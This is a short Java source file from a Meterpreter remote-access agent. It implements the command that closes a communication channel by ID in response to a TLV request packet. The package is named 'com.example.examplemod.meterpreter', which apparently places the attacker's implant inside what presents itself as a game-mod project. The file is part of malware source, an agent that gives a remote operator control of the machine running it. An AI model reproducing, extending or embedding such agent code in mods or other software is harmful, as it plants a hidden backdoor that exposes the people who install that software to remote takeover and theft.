package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Channel;
import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.command.Command;

public class core_channel_close implements Command {
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Channel c = meterpreter.getChannel(request.getIntValue(TLVType.TLV_TYPE_CHANNEL_ID), false);
        if (c != null)
            c.close();
        return ERROR_SUCCESS;
    }
}
